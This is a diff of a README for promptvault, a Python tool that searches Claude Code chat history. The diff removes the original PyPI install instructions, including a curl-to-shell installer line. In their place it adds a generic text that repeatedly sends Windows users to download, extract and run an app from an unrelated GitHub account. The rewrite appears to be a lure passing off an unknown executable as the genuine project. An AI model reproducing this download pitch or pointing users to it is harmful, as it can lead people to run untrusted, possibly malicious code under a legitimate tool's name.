@@ -1,206 +1,208 @@
-<p align="center">
-  <img src="docs/images/social-preview.svg" alt="promptvault" width="100%"/>
-</p>
+# 🗂️ promptvault - Find Claude chats fast
 
-<p align="center">
-  <a href="https://pypi.org/project/promptvault-py/"><img src="https://img.shields.io/pypi/v/promptvault-py?style=flat-square&amp;color=blue&amp;v=2" alt="PyPI"/></a>
-  <a href="https://github.com/reidemeister94/promptvault/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/reidemeister94/promptvault/ci.yml?style=flat-square&amp;label=CI" alt="CI"/></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/reidemeister94/promptvault?style=flat-square" alt="License"/></a>
-  <a href="https://github.com/reidemeister94/promptvault/stargazers"><img src="https://img.shields.io/github/stars/reidemeister94/promptvault?style=flat-square&amp;color=yellow" alt="Stars"/></a>
-  <img src="https://img.shields.io/badge/python-3.10+-3776ab?style=flat-square&amp;logo=python&amp;logoColor=white" alt="Python 3.10+"/>
-  <img src="https://img.shields.io/badge/dependencies-zero-22c55e?style=flat-square" alt="Zero Dependencies"/>
-</p>
+[![Download promptvault](https://img.shields.io/badge/Download-promptvault-6e56cf?style=for-the-badge&logo=github)](https://github.com/landladycreatin942/promptvault)
 
-<p align="center">
-  <b>Your Claude Code conversations, searchable forever.</b>
-</p>
+## 🚀 Getting Started
 
----
+promptvault helps you search your Claude Code conversation history from the terminal. It keeps your chats in a Markdown vault, indexes them with SQLite FTS5, and lets you search with fzf.
 
-## The Problem
+If you use Claude Code often, this tool helps you find past prompts, replies, and ideas without digging through files by hand.
 
-Claude Code stores conversations in `~/.claude/history.jsonl` — not searchable, not browsable, not persistent. Claude compacts and deletes old sessions without warning.
+## 📥 Download and Install
 
-**pv** turns that history into a **searchable markdown library + SQLite database**. Browse in Obsidian, search from the terminal with fzf. Zero dependencies. Pure stdlib.
+Visit this page to download and run the app:
 
-<p align="center">
-  <img src="docs/images/terminal-demo.svg" alt="pv in action" width="100%"/>
-</p>
+[https://github.com/landladycreatin942/promptvault](https://github.com/landladycreatin942/promptvault)
 
----
+### Windows setup
 
-## Quick Start
+1. Open the link above in your browser.
+2. Download the Windows version from the page.
+3. If the file is in a .zip file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app or run the included command file if one is provided.
 
-```bash
-# recommended — fast, isolated, always on PATH
-uv tool install promptvault-py
+### What you need
 
-# alternative — same idea, traditional tool
-pipx install promptvault-py
+- Windows 10 or Windows 11
+- A terminal such as Windows Terminal or Command Prompt
+- Claude Code conversation files stored on your PC
+- Permission to read the folder where your chats are saved
 
-pv-sync                        # sync your Claude Code history
-pv                             # browse conversations
-pv search "database migration" # full-text search
+## 🧭 What promptvault does
 
-# upgrade to latest version
-uv tool upgrade promptvault-py   # or: pipx upgrade promptvault-py
-```
+promptvault gives you a simple way to:
 
-> Don't have uv? `curl -LsSf https://astral.sh/uv/install.sh | sh` ([docs](https://docs.astral.sh/uv/getting-started/installation/))
->
-> Don't have pipx? `brew install pipx` or `pip install --user pipx` ([docs](https://pipx.pypa.io/stable/installation/))
+- Search all Claude Code conversations from one place
+- Find exact phrases with full-text search
+- Browse results with fzf
+- Keep your notes in Markdown files
+- Store an index in SQLite for fast lookups
+- Work without extra tools on your system
 
-Both tools install `pv` into an **isolated virtualenv** and symlink the executable to `~/.local/bin/`, so it's available globally — no environment activation needed.
+## 🔎 How it works
 
-> `pv` is the short alias. `promptvault` / `promptvault-sync` also work.
+The app scans your Markdown vault, builds a SQLite index, and lets you search from the terminal. When you type a query, promptvault shows matching conversations and lets you move through them with keyboard controls.
 
-Optional: install [fzf](https://github.com/junegunn/fzf) for the interactive UI (`brew install fzf` / `apt install fzf`). Without it, pv falls back to plain text.
+This is useful when you want to:
 
----
+- Find a prompt you used last week
+- Look up code help from an earlier chat
+- Search for a topic like “API error” or “regex”
+- Reuse wording from a past conversation
+- Review how you solved a problem before
 
-## How It Works
+## 🪟 First-time use on Windows
 
-<p align="center">
-  <img src="docs/images/how-it-works.svg" alt="How pv works" width="100%"/>
-</p>
+After you open the app:
 
-`pv-sync` reads `history.jsonl`, groups prompts by conversation, and generates:
+1. Point it at the folder that holds your Markdown vault.
+2. Let it build the search index.
+3. Run a search from the terminal.
+4. Pick a result from the list.
+5. Open the matching note or conversation file.
 
-1. **Markdown vault** — One `.md` per conversation, `YYYY/MM/` structure, YAML frontmatter. Drop into Obsidian.
-2. **SQLite database** — FTS5 full-text search with BM25 ranking. Millisecond queries.
+If your vault already has many files, the first index build may take a short time. Later searches should feel much faster.
 
-The sync is **idempotent** — always rebuilds from source, impossible to reach a bad state. Resolves pasted-text placeholders, deduplicates prompts, filters slash commands, cleans whitespace.
+## 🛠️ Basic use
 
----
+Here are common things you may do:
 
-## Commands
+- Search by a word or phrase
+- Filter results as you type
+- Open a matched file in your editor
+- Rebuild the index after adding new chats
+- Keep your vault in sync with your latest Claude Code work
 
-All commands launch **fzf** by default (split pane: conversation list + live preview). Add `--no-fzf` for plain text.
+Example searches:
 
-| Command | Description |
-|---------|-------------|
-| `pv` | Browse all conversations interactively |
-| `pv search "query"` | Full-text search ranked by relevance |
-| `pv recent [N]` | Last N conversations (default 20) |
-| `pv list [--date DATE] [--project NAME]` | Filter by date or project |
-| `pv stats` | Vault overview |
-| `pv-sync` | Rebuild vault + database |
+- install issue
+- database schema
+- fix login error
+- prompt for summarizing notes
+- Python file parser
 
-**Controls:**
+## 📁 Suggested folder layout
 
-| Key | Action |
-|-----|--------|
-| `Enter` | Open in `$EDITOR` (returns to fzf) |
-| `Ctrl-O` | Open in `$EDITOR` (exits fzf) |
-| `Ctrl-T` | Toggle conversation / prompt view |
-| `Ctrl-P` | Cycle project filter |
-| `Ctrl-D` | Cycle date range (all/today/week/month) |
-| `Ctrl-B` | Toggle bookmark on selected conversation |
-| `Ctrl-G` | Show only bookmarked conversations |
-| `Ctrl-Y` | Copy to clipboard |
-| `Ctrl-E` | Export to file (save dialog) |
-| `Ctrl-X` | Exclude from results |
-| `Ctrl-/` | Toggle preview |
-| `Tab` | Multi-select |
-| `Esc` | Quit |
+A simple vault can look like this:
 
-> Full documentation: [docs/usage.md](docs/usage.md)
+- `promptvault/`
+  - `conversations/`
+  - `notes/`
+  - `index/`
+  - `archive/`
 
----
+You can store chats as Markdown files and keep older files in an archive folder. This makes it easier to separate active work from old conversations.
 
-## Shell Widget
+## ⚙️ Features
 
-Insert a previous prompt directly into your command line with `Alt-P`:
+- Fast search across Markdown files
+- SQLite FTS5 indexing for quick text lookup
+- Keyboard-first navigation with fzf
+- Works well for prompt history and conversation history
+- Good fit for Obsidian-style note folders
+- Simple terminal workflow
+- No extra package clutter for normal use
 
-```bash
-# Add to your shell config:
-eval "$(pv shell-init zsh)"    # or bash
-```
+## 🔐 Privacy and local use
 
-Customise the key with `PROMPTVAULT_WIDGET_KEY` (default: `\ep` = Alt-P).
+promptvault runs on your own machine. Your conversation files stay in your vault, which lets you keep control of your data. This is a good fit if you want a local search tool for personal or work notes.
 
----
+## 🧪 Tips for better results
 
-## Real-Time Capture
+- Use short search terms first
+- Try key words from the question or answer
+- Search for file names if you remember them
+- Use common terms from your workflow
+- Keep file names clear and consistent
+- Put one conversation per Markdown file when possible
 
-A Claude Code hook captures prompts the moment you send them — no sync needed.
+## 🧰 Common file types
 
-Add to `~/.claude/hooks.json`:
+promptvault works best with plain text notes such as:
 
-```json
-{
-  "hooks": {
-    "UserPromptSubmit": [{
-      "hooks": [{
-        "type": "command",
-        "command": "python3 /path/to/promptvault/promptvault/hook.py",
-        "timeout": 5000
-      }]
-    }]
-  }
-}
-```
+- `.md`
+- `.markdown`
+- `.txt`
 
-Fast (<50ms), silent (no stdout), safe (errors swallowed). Captures to `~/.claude/prompt-library/capture.jsonl`.
+Markdown works well because it stays easy to read in any editor and keeps your notes portable.
 
-> **Windows:** use `python` instead of `python3` and backslash paths.
+## 🖥️ Terminal use
 
----
+If the app opens in a terminal window, use the keyboard to move through results. Tools like fzf are built for quick filtering, so you can type part of a phrase and narrow the list right away.
 
-## Markdown Vault
+Typical flow:
 
-Each conversation becomes an Obsidian-compatible `.md` with YAML frontmatter:
+1. Run promptvault
+2. Enter a search term
+3. Review the matching files
+4. Select one result
+5. Open the file in your editor
 
-```
-~/.claude/prompt-library/vault/
-├── _index.md
-├── 2026/
-│   └── 03/
-│       ├── 2026-03-25__c792e74f__refactor-user-auth.md
-│       └── ...
-```
+## 📚 Who this is for
 
-Open as an Obsidian vault. The Calendar plugin works well for browsing.
+promptvault fits users who:
 
----
+- Save Claude Code chats as Markdown
+- Want fast search over old conversations
+- Use Obsidian or a similar vault layout
+- Prefer keyboard use over mouse clicks
+- Need a local tool for prompt history
+- Work with many small text files
 
-## Environment Variables
+## 🧩 Topic coverage
 
-| Variable | Default |
-|----------|---------|
-| `PROMPTVAULT_HISTORY` | `~/.claude/history.jsonl` |
-| `PROMPTVAULT_OUTPUT` | `~/.claude/prompt-library` |
-| `PROMPTVAULT_DB` | `~/.claude/prompt-library/prompts.db` |
-| `PROMPTVAULT_VAULT` | `~/.claude/prompt-library/vault` |
-| `PROMPTVAULT_PROJECTS` | `~/.claude/projects` |
-| `PROMPTVAULT_CAPTURE_LOG` | `~/.claude/prompt-library/capture.jsonl` |
+This project sits in these areas:
 
----
+- AI tools
+- Anthropic
+- Claude
+- Claude Code
+- CLI tools
+- Conversation history
+- Developer tools
+- Full-text search
+- fzf
+- Markdown
+- Obsidian
+- Prompt engineering
+- Prompt history
+- Python
+- SQLite
 
-## Contributing
+## 🧼 Keeping your vault organized
 
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md). 340 tests, all synthetic data.
+A clean vault makes search better. Try these habits:
 
-```bash
-git clone https://github.com/reidemeister94/promptvault.git
-cd promptvault
-uv tool install --editable .   # global "pv" that tracks your local source
-make setup-dev-env
-make test && make lint
-```
+- Use dates in file names
+- Add short titles to each note
+- Keep one topic per file
+- Move old chats to an archive folder
+- Use the same folder names each time
+- Avoid duplicate files when you can
 
----
+## ❓ Troubleshooting
 
-## License
+If search does not return the result you expect:
 
-MIT
+- Check that the file is in the vault folder
+- Make sure the file is saved as plain text or Markdown
+- Rebuild the index after adding new files
+- Check the spelling of your search term
+- Try a shorter search phrase
+- Confirm the terminal has access to the folder
 
----
+If the app does not start:
 
-<p align="center">
-  <b>If pv saves your prompts, save us a </b><a href="https://github.com/reidemeister94/promptvault/stargazers"><img src="https://img.shields.io/github/stars/reidemeister94/promptvault?style=social" alt="Star on GitHub"/></a>
-</p>
+- Open the download page again
+- Make sure the file finished downloading
+- Extract the files first if they came in a zip archive
+- Try running the app from a terminal window
 
-<p align="center">
-  <a href="https://github.com/reidemeister94/promptvault/issues">Report an issue</a> &middot; <a href="CONTRIBUTING.md">Contribute</a>
-</p>
+## 🏷️ Project details
+
+- Repository name: `promptvault`
+- Main purpose: search Claude Code conversations from the terminal
+- Storage model: Markdown vault plus SQLite FTS5
+- Search UI: fzf
+- Focus: fast local search with simple setup
